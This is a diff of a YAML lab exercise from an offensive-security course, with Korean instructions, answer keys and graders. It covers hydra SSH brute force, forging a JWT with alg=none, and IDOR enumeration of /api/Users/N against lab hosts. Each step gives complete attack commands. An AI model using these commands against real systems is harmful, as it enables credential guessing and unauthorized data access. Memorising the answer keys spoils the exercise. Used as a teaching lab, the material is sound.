@@ -1,72 +1,143 @@
 lab_id: standalone-attack-week06
-title: 인증 + 접근제어 (hydra / JWT / IDOR)
+title: 인증·접근제어 — hydra brute / JWT 변조 / IDOR
 version: standalone-non-ai
 course: attack
 week: 6
-description: A01 + A07 — hydra brute / JWT alg=none / IDOR / session.
+description: |
+  OWASP A01 (Broken Access Control) + A07 (Auth Failures). hydra SSH brute / JWT
+  alg=none 변조 / IDOR 시퀀스 시도.
 difficulty: medium
 duration_minutes: 150
 prerequisites: [W05]
-objectives: [hydra brute, JWT 우회, IDOR]
+objectives:
+  - "hydra SSH brute (제한 wordlist)"
+  - "JWT alg=none 우회 시뮬"
+  - "IDOR /api/Users/N 시퀀스"
 pass_threshold: 0.7
 steps:
+
   - order: 1
-    instruction: hydra SSH brute (제한)
-    hint: hydra -L users.txt -P pass.txt 10.20.30.201 ssh
+    instruction: |
+      ## 🎯 MISSION
+
+      hydra 로 **bastion (10.20.30.201)** 의 SSH 인증 brute (제한 wordlist, 학습용).
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-attacker '
+      echo -e "ccc\nadmin\nroot" > /tmp/u.txt
+      echo -e "ccc\npassword\nadmin\n1\nletmein" > /tmp/p.txt
+      timeout 20 hydra -L /tmp/u.txt -P /tmp/p.txt -t 1 -f 10.20.30.201 ssh 2>&1 | tail -10
+      '
+      ```
+
+      ## 📋 확인 사항
+
+      - hydra 실행 출력
+      - 학습 환경의 ccc:ccc 또는 ccc:1 매치 (성공) 가능
+
+      ## 💡 왜 이걸 하는가?
+
+      OWASP A07 — Auth Failures. hydra 는 service 별 brute force 표준 도구.
+
+      ## 🔍 결과 해석
+
+      - **정상**: hydra 실행 + 인증 시도 출력
+      - **W09 secuops 학습**: Wazuh 5710/5712 룰이 SSH 인증 실패 감지 → Active Response 자동 차단 가능
+    hint: hydra -L -P SSH brute
     category: exploit
-    points: 25
+    points: 20
     answer: |
       ssh 6v6-attacker '
-      echo -e "admin\nccc\nroot" > /tmp/users.txt
-      echo -e "ccc\nadmin\npassword\n1" > /tmp/pass.txt
-      timeout 15 hydra -L /tmp/users.txt -P /tmp/pass.txt -t 1 -f 10.20.30.201 ssh -s 22 2>&1 | tail -10
+      echo -e "ccc\nadmin\nroot" > /tmp/u.txt
+      echo -e "ccc\npassword\nadmin\n1\nletmein" > /tmp/p.txt
+      timeout 20 hydra -L /tmp/u.txt -P /tmp/p.txt -t 1 -f 10.20.30.201 ssh 2>&1 | tail -10
       '
-    answer_detail: hydra 결과
+    answer_detail: hydra SSH brute (제한 wordlist).
     verify:
       type: output_contains
-      expect: ssh
+      expect: hydra
       field: stdout
       semantic:
-        intent: hydra brute
-        success_criteria: [hydra 실행]
+        intent: "hydra brute"
+        success_criteria: ["hydra 실행"]
         acceptable_methods:
           - "**[OSS] hydra -L -P SSH brute**"
           - "**[OSS] -t thread / -f stop on first**"
           - "**[OSS] -e nsr null/same/reverse**"
-          - "**[OSS] HTTP post form -H Host**"
-          - "**[OSS] medusa 대안**"
-          - "**[OSS] patator 모던 대안**"
-          - "**[OSS] Wazuh rule 5710/5712 detection**"
-          - "**[OSS] fail2ban / Active Response 대응**"
+          - "**[OSS] http-post-form**"
+          - "**[OSS] medusa / patator 대안**"
+          - "**[OSS] Wazuh 5710/5712 detection (W09)**"
+          - "**[OSS] fail2ban 자동 차단**"
+          - "**[OSS] ATT&CK T1110.001 Password Guessing**"
     target_vm: attacker
 
   - order: 2
-    instruction: JWT alg=none 변조
-    hint: echo "{\"alg\":\"none\"}" | base64
+    instruction: |
+      ## 🎯 MISSION
+
+      JuiceShop 의 JWT 받고 **alg=none 변조** 시뮬 + IDOR `/api/Users/N` 시퀀스.
+
+      ## 💻 실행 명령
+
+      ```bash
+      # JWT alg=none 변조 (base64)
+      H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr "+/" "-_" | tr -d "=")
+      P=$(echo -n '{"user":"admin","role":"admin"}' | base64 -w0 | tr "+/" "-_" | tr -d "=")
+      echo "변조 JWT: $H.$P."
+
+      # IDOR /api/Users/1-5 시퀀스
+      ssh 6v6-attacker '
+      for id in 1 2 3 4 5; do
+        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/api/Users/$id")
+        echo "User $id: $code"
+      done
+      '
+      ```
+
+      ## 📋 확인 사항
+
+      - 변조 JWT 생성 (header.payload. signature 빈 칸)
+      - IDOR 5 시도 → 200 응답 (인증 없이 사용자 데이터 노출 = IDOR 취약)
+
+      ## 💡 왜 이걸 하는가?
+
+      JWT alg=none 우회는 일부 라이브러리의 인증 우회 — 유명 취약점. IDOR 은 가장 흔한
+      A01 (접근 제어 실패).
+
+      ## 🔍 결과 해석
+
+      - **JWT alg=none**: 일부 서버는 이 변조로 인증 우회 (production 은 alg whitelist 적용)
+      - **IDOR**: 5 user 데이터 모두 200 → 권한 검증 부재
+    hint: JWT 변조 + IDOR 시퀀스
     category: exploit
     points: 25
     answer: |
-      ssh 6v6-attacker '
-      H=$(echo -n "{\"alg\":\"none\",\"typ\":\"JWT\"}" | base64 -w0 | tr "+/" "-_" | tr -d "=")
-      P=$(echo -n "{\"user\":\"admin\",\"role\":\"admin\"}" | base64 -w0 | tr "+/" "-_" | tr -d "=")
+      H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr "+/" "-_" | tr -d "=")
+      P=$(echo -n '{"user":"admin","role":"admin"}' | base64 -w0 | tr "+/" "-_" | tr -d "=")
       echo "변조 JWT: $H.$P."
-      curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer $H.$P." -H "Host: juice.6v6.lab" http://10.20.30.1/rest/user/whoami
+      ssh 6v6-attacker '
+      for id in 1 2 3 4 5; do
+        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: juice.6v6.lab" "http://10.20.30.1/api/Users/$id")
+        echo "User $id: $code"
+      done
       '
-    answer_detail: alg=none JWT + 응답
+    answer_detail: JWT 변조 + IDOR 5 시퀀스.
     verify:
       type: output_contains
-      expect: JWT
+      expect: User
       field: stdout
       semantic:
-        intent: JWT 우회
-        success_criteria: [JWT 변조]
+        intent: "JWT 우회 + IDOR"
+        success_criteria: ["변조 JWT", "5 user IDOR"]
         acceptable_methods:
           - "**[OSS] base64 + alg=none 변조**"
           - "**[OSS] jwt_tool 자동화**"
           - "**[OSS] HS256 secret brute (hashcat -m 16500)**"
-          - "**[OSS] RS256 + key confusion 공격**"
-          - "**[OSS] kid header path traversal**"
-          - "**[OSS] payload exp/iat 변조**"
-          - "**[OSS] JuiceShop challenge 의 JWT 우회**"
-          - "**[OSS] 운영 권장 — strict alg list**"
+          - "**[OSS] kid header injection**"
+          - "**[OSS] /api/Users/N sequence**"
+          - "**[OSS] /api/Cards/N IDOR**"
+          - "**[OSS] T1078 Valid Accounts**"
+          - "**[OSS] CWE-639 Authorization Bypass**"
     target_vm: attacker
